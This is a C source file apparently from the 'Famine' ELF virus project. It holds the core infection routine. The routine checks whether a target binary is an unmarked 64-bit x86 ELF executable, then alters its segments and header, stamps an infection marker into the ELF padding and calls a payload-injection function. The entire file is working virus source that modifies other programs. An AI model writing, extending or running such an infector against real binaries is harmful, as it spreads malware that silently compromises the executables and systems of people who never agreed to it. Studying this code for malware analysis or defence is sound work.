#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline Elf64_Ehdr *get_header(struct s_info *info)
{
	Elf64_Ehdr *header;
	
	header = (Elf64_Ehdr *)info->ptr;

	if (info->ptr + sizeof(Elf64_Ehdr) >= info->ptr + info->size)
		Exit(0);

	return header;
}

static inline bool is_elf(const Elf64_Ehdr *header)
{
	return *(unsigned int *)header == ELF_MAGIC_NUMBER;
}

static inline bool is_x86(const Elf64_Ehdr *header)
{
	return header->e_ident[EI_CLASS] == X86_64;
}

static inline bool is_linked(const Elf64_Ehdr *header)
{
	return header->e_entry != 0;
}

static inline bool is_not_infected(const Elf64_Ehdr *header)
{
	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
}


////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void famine(const char *file, const size_t m_entry, const int trace)
{
	// BEG_TRACE
	char buf[] = "Famine on ";
	char buf1[] = "\n\n";
	_write(trace, buf, _strlen(buf));
	_write(trace, file, _strlen(file));
	_write(trace, buf1, _strlen(buf1));

	char buf2[] = "checking for criteria of infection\n";
	_write(trace, buf2, _strlen(buf2));
	// END_TRACE

	struct s_info info = get_info(file);
	Elf64_Ehdr *header = get_header(&info);
	const struct criteria crit[] =
	{
		(const struct criteria){&is_elf},
		(const struct criteria){&is_x86},
		(const struct criteria){&is_linked},
		(const struct criteria){&is_not_infected},
	};

	
	for (unsigned char index = 0; index < CRITERIA_SIZE; index++)
	{
		if (crit[index].fct(header) == false)
		{
			// BEG_TRACE
			char buf3[] = "binary is not infectable\n\n";
			_write(trace, buf3, _strlen(buf3));
			// END_TRACE

			Exit(0);
		}
	}

	// BEG_TRACE
	char buf4[] = "binary is infectable\n";
	_write(trace, buf4, _strlen(buf4));
	// END_TRACE

	modify_segment(&info);

	*(uint32_t *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
	header->e_shoff += info.offs_padding + PAYLOAD_SIZE;

	inject(&info, m_entry, trace);

	release_info(&info);
}
